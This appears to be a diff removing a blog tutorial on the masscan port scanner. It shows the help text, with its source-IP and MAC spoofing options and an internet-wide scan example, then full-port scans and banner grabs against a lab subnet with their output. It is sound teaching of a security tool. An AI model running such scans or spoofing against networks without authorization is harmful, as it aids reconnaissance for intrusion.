- list those options that are compatible with nmap
-masscan -p80 10.0.0.0/8 --banners -oB &lt;filename&gt;
- save results of scan in binary format to &lt;filename&gt;
-masscan --open --banners --readscan &lt;filename&gt; -oX &lt;savefile&gt;
- read binary scan results in &lt;filename&gt; and save them as xml in &lt;savefile&gt;
-</code></p>
-
-<p>More information:</p>
-
-<p><code>
-root@kali:~# masscan --help
-MASSCAN is a fast port scanner. The primary input parameters are the
-IP addresses/ranges you want to scan, and the port numbers. An example
-is the following, which scans the 10.x.x.x network for web servers:
- masscan 10.0.0.0/8 -p80
-The program auto-detects network interface/adapter settings. If this
-fails, you'll have to set these manually. The following is an
-example of all the parameters that are needed:
- --adapter-ip 192.168.10.123
- --adapter-mac 00-11-22-33-44-55
- --router-mac 66-55-44-33-22-11
-Parameters can be set either via the command-line or config-file. The
-names are the same for both. Thus, the above adapter settings would
-appear as follows in a configuration file:
- adapter-ip = 192.168.10.123
- adapter-mac = 00-11-22-33-44-55
- router-mac = 66-55-44-33-22-11
-All single-dash parameters have a spelled out double-dash equivalent,
-so '-p80' is the same as '--ports 80' (or 'ports = 80' in config file).
-To use the config file, type:
- masscan -c &lt;filename&gt;
-To generate a config-file from the current settings, use the --echo
-option. This stops the program from actually running, and just echoes
-the current configuration instead. This is a useful way to generate
-your first config file, or see a list of parameters you didn't know
-about. I suggest you try it now:
- masscan -p1234 --echo
-</code></p>
-
-<p>Config file:</p>
-
-<blockquote><p>By default, the program will read default configuration from  the  file
-/etc/masscan/masscan.conf. This is useful for system-specific settings,
-such as the &mdash;adapter-xxx options. This is also useful for excluded  IP
-addresses,  so  that  you  can scan the entire Internet, while skipping
-dangerous addresses, like those owned by the DoD, and not make an accidental mistake.</p></blockquote>
-
-<p>Nmap compatible options:</p>
-
-<p>```
-root@kali:~# masscan &mdash;nmap                                                <br/>
-Masscan (<a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a>)
-Usage: masscan [Options] -p{Target-Ports} {Target-IP-Ranges}
-TARGET SPECIFICATION:
-  Can pass only IPv4 address, CIDR networks, or ranges (non-nmap style)
-  Ex: 10.0.0.0/8, 192.168.0.1, 10.0.0.1-10.0.0.254
-  -iL <inputfilename>: Input from list of hosts/networks
-  &mdash;exclude &lt;host1[,host2][,host3],&hellip;>: Exclude hosts/networks
-  &mdash;excludefile &lt;exclude_file>: Exclude list from file
-  &mdash;randomize-hosts: Randomize order of hosts (default)
-HOST DISCOVERY:
-  -Pn: Treat all hosts as online (default)
-  -n: Never do DNS resolution (default)
-SCAN TECHNIQUES:
-  -sS: TCP SYN (always on, default)
-SERVICE/VERSION DETECTION:
-  &mdash;banners: get the banners of the listening service if available. The</p>
-
-<pre><code>default timeout for waiting to recieve data is 30 seconds.
-</code></pre>
-
-<p>PORT SPECIFICATION AND SCAN ORDER:
-  -p <port ranges>: Only scan specified ports</p>
-
-<pre><code>Ex: -p22; -p1-65535; -p 111,137,80,139,8080
-</code></pre>
-
-<p>TIMING AND PERFORMANCE:
-  &mdash;max-rate <number>: Send packets no faster than <number> per second
-  &mdash;connection-timeout <number>: time in seconds a TCP connection will</p>
-
-<pre><code>timeout while waiting for banner data from a port.
-</code></pre>
-
-<p>FIREWALL/IDS EVASION AND SPOOFING:
-  -S/&mdash;source-ip &lt;IP_Address>: Spoof source address
-  -e <iface>: Use specified interface
-  -g/&mdash;source-port <portnum>: Use given port number
-  &mdash;ttl <val>: Set IP time-to-live field
-  &mdash;spoof-mac <mac address/prefix/vendor name>: Spoof your MAC address
-OUTPUT:
-  &mdash;output-format <format>: Sets output to binary/list/unicornscan/json/grepable/xml
-  &mdash;output-file <file>: Write scan results to file. If &mdash;output-format is</p>
-
-<pre><code> not given default is xml
-</code></pre>
-
-<p>  -oL/-oJ/-oG/-oB/-oX/-oU <file>: Output scan in List/JSON/Grepable/Binary/XML/Unicornscan format,</p>
-
-<pre><code> respectively, to the given filename. Shortcut for
- --output-format &lt;format&gt; --output-file &lt;file&gt;
-</code></pre>
-
-<p>  -v: Increase verbosity level (use -vv or more for greater effect)
-  -d: Increase debugging level (use -dd or more for greater effect)
-  &mdash;open: Only show open (or possibly open) ports
-  &mdash;packet-trace: Show all packets sent and received
-  &mdash;iflist: Print host interfaces and routes (for debugging)
-  &mdash;append-output: Append to rather than clobber specified output files
-  &mdash;resume <filename>: Resume an aborted scan
-MISC:
-  &mdash;send-eth: Send using raw ethernet frames (default)
-  -V: Print version number
-  -h: Print this help summary page.
-EXAMPLES:
-  masscan -v -sS 192.168.0.0/16 10.0.0.0/8 -p 80
-  masscan 23.0.0.0/0 -p80 &mdash;banners -output-format binary &mdash;output-filename internet.scan
-  masscan &mdash;open &mdash;banners &mdash;readscan internet.scan -oG internet_scan.grepable
-SEE (<a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a>) FOR MORE HELP
-```</p>
-
-<p>Manpage: <a href="http://manpages.org/masscan/8">http://manpages.org/masscan/8</a></p>
-
-<h2>masscan usage</h2>
-
-<ul>
-<li>look at the current configuration</li>
-</ul>
-
-
-<p>```
-root@kali:~# masscan &mdash;echo
-rate =     100.00
-randomize-hosts = true
-seed = 9262294816069822464
-shard = 1/1</p>
-
-<h1>ADAPTER SETTINGS</h1>
-
-<p>adapter =
-adapter-ip = 0.0.0.0
-adapter-mac = 00:00:00:00:00:00
-router-mac = 00:00:00:00:00:00</p>
-
-<h1>OUTPUT/REPORTING SETTINGS</h1>
-
-<p>output-format = unknown(0)
-show = open,,
-output-filename =
-rotate = 0
-rotate-dir = .
-rotate-offset = 0
-rotate-filesize = 0
-pcap =</p>
-
-<h1>TARGET SELECTION (IP, PORTS, EXCLUDES)</h1>
-
-<p>retries = 0
-ports =</p>
-
-<p>capture = cert
-nocapture = html
-nocapture = heartbleed</p>
-
-<p>min-packet = 60
-```</p>
-
-<ul>
-<li>check installation</li>
-</ul>
-
-
-<p><code>
-masscan --regress
-regression test: success!
-</code></p>
-
-<ul>
-<li>full port scan on local subnet</li>
-</ul>
-
-
-<p>```
-root@kali:~# masscan -p0-65535 192.168.217.0/24 &mdash;rate 100000</p>
-
-<p>Starting masscan 1.0.3 (<a href="http://bit.ly/14GZzcT">http://bit.ly/14GZzcT</a>) at 2017-06-10 09:02:34 GMT
- &mdash; forced options: -sS -Pn -n &mdash;randomize-hosts -v &mdash;send-eth
-Initiating SYN Stealth Scan
-Scanning 256 hosts [65536 ports/host]
-Discovered open port 443/tcp on 192.168.217.131                              <br/>
-Discovered open port 139/tcp on 192.168.217.133                              <br/>
-Discovered open port 139/tcp on 192.168.217.134                              <br/>
-Discovered open port 139/tcp on 192.168.217.131                              <br/>
-Discovered open port 111/tcp on 192.168.217.131                              <br/>
-Discovered open port 23/tcp on 192.168.217.133                               <br/>
-Discovered open port 21/tcp on 192.168.217.133                               <br/>
-Discovered open port 22/tcp on 192.168.217.131                               <br/>
-Discovered open port 22/tcp on 192.168.217.135                               <br/>
-Discovered open port 5432/tcp on 192.168.217.133                             <br/>
-Discovered open port 135/tcp on 192.168.217.134                              <br/>
-Discovered open port 22/tcp on 192.168.217.133                               <br/>
-Discovered open port 25/tcp on 192.168.217.133                               <br/>
-Discovered open port 53/tcp on 192.168.217.133                               <br/>
-Discovered open port 3632/tcp on 192.168.217.133                             <br/>
-Discovered open port 80/tcp on 192.168.217.135                               <br/>
-Discovered open port 80/tcp on 192.168.217.131                               <br/>
-Discovered open port 80/tcp on 192.168.217.133                               <br/>
-Discovered open port 445/tcp on 192.168.217.131                              <br/>
-Discovered open port 445/tcp on 192.168.217.133                              <br/>
-Discovered open port 445/tcp on 192.168.217.134                              <br/>
-Discovered open port 8180/tcp on 192.168.217.133                             <br/>
-Discovered open port 8009/tcp on 192.168.217.133                             <br/>
-Discovered open port 3306/tcp on 192.168.217.133 <br/>
-```</p>
-
-<p>The scan was done in a couple of minutes. You might be wondering, how does this tool scan the entire internet in 3 minutes if it took the same length of time for a puny subnet? Well, there are some limitations. To get the most of its speed, you need the proper adapter and driver. Also notice that I rate-limited it to 100k packets per second, because I didn&rsquo;t want my local network to blow up! If you want to benchmark masscan&rsquo;s performance, look on its homepage, under the Performance testing section.</p>
-
-<ul>
-<li>grab banners of open ports</li>
-</ul>
-
-
-<p>```
-root@kali:~# masscan 192.168.217.0/24 -p22,80,139,445,3306 &mdash;banners &mdash;source-ip 192.168.217.150 &mdash;rate 100000</p>
-
-<p>Starting masscan 1.0.3 (<a href="http://bit.ly/14GZzcT">http://bit.ly/14GZzcT</a>) at 2017-06-10 09:18:27 GMT
- &mdash; forced options: -sS -Pn -n &mdash;randomize-hosts -v &mdash;send-eth
-Initiating SYN Stealth Scan
-Scanning 256 hosts [5 ports/host]
-Discovered open port 80/tcp on 192.168.217.133                               <br/>
-Discovered open port 139/tcp on 192.168.217.134                              <br/>
-Discovered open port 22/tcp on 192.168.217.133                               <br/>
-Discovered open port 139/tcp on 192.168.217.133                              <br/>
-Discovered open port 22/tcp on 192.168.217.131                               <br/>
-Discovered open port 80/tcp on 192.168.217.131                               <br/>
-Discovered open port 445/tcp on 192.168.217.131                              <br/>
-Discovered open port 139/tcp on 192.168.217.131                              <br/>
-Discovered open port 22/tcp on 192.168.217.135                               <br/>
-Discovered open port 80/tcp on 192.168.217.135                               <br/>
-Banner on port 22/tcp on 192.168.217.135: [ssh] SSH-2.0-OpenSSH_5.5p1 Debian-6+squeeze2
-Banner on port 22/tcp on 192.168.217.133: [ssh] SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1
-Banner on port 22/tcp on 192.168.217.131: [ssh] SSH-2.0-OpenSSH_6.6.1        <br/>
-Discovered open port 445/tcp on 192.168.217.134                              <br/>
-Discovered open port 445/tcp on 192.168.217.133                              <br/>
-Discovered open port 3306/tcp on 192.168.217.133                             <br/>
-Banner on port 3306/tcp on 192.168.217.133: [unknown] \x3e\x00\x00\x00\x0a5.0.51a-3ubuntu5\x00\x07\x00\x00\x00M<code>yb]-d3\x00,\xaa\x08\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00q^e</code>0o`r\x3crLb\x00
-Banner on port 80/tcp on 192.168.217.131: [http] HTTP/1.1 200 OK\x0d\x0aDate: Sat, 10 Jun 2017 09:18:35 GMT\x0d\x0aServer: Apache/2.4.6 (CentOS) OpenSSL/1.0.1e-fips\x0d\x0aLast-Modified: Tue, 02 Aug 2016 13:07:09 GMT\x0d\x0aETag: \x2211-5391664f1e697\x22\x0d\x0aAccept-Ranges: bytes\x0d\x0aContent-Length: 17\x0d\x0aConnection: close\x0d\x0aContent-Type: text/html; charset=UTF-8\x0d\x0a\x0d
-Banner on port 80/tcp on 192.168.217.133: [http] HTTP/1.1 200 OK\x0d\x0aDate: Sat, 10 Jun 2017 09:18:36 GMT\x0d\x0aServer: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch\x0d\x0aLast-Modified: Wed, 17 Mar 2010 14:08:25 GMT\x0d\x0aETag: \x22107f7-2d-481ffa5ca8840\x22\x0d\x0aAccept-Ranges: bytes\x0d\x0aContent-Length: 45\x0d\x0aConnection: close\x0d\x0aContent-Type: text/html\x0d\x0a\x0d
-```</p>
-
-<p>For this option to work, you have to give masscan its own IP address on the local subnet, something unused by another device. In fact, the recommendation from its homepage is to use it with its separate IP address whenever possible.</p>
-
-<p>And here is how the XML output of the previous scan would look in a spreadsheet:</p>
-
-<p><img class="center" src="/images/tools/masscan-xml.png" title="&lsquo;masscan xml&rsquo; &lsquo;masscan xml output&rsquo;" ></p>
-
-<p>Some other features are:</p>
-
-<ul>
-<li><p>output formats in xml, binary, grepable, list, or JSON</p></li>
-<li><p>resume scans</p></li>
-<li><p>exclude targets</p></li>
-<li><p>runs in Linux, Windows, and Mac OS X</p></li>
-</ul>
-
-
-<h3>More resources</h3>
-
-<ul>
-<li><p><a href="http://blog.erratasec.com/2013/09/masscan-entire-internet-in-3-minutes.html">Robert Graham post on masscan</a></p></li>
-<li><p><a href="https://josephpierini.blogspot.com/2016/06/using-masscan-with-top-ports.html">select common ports with Nmap and feed them to Masscan</a></p></li>
-</ul>
-
-
-<p>```
-/ Your own qualities will help prevent \
-\ your advancement in the world.       /</p>
 
 <hr />
 
